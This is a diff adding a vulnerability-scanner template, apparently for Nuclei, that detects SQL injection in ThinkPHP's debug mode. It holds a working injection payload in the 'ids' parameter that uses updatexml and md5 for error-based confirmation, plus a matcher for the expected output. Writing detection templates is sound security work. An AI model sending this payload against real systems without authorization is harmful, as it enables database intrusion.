@@ -1,0 +1,19 @@
+id: thinkphp-debug-index-ids-sqli
+info:
+  name: "ThinkPHP Debug Mode index 参数SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: thinkphp
+  description: |
+    ThinkPHP Debug mode in index/ids parameter is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "56540676a129760"
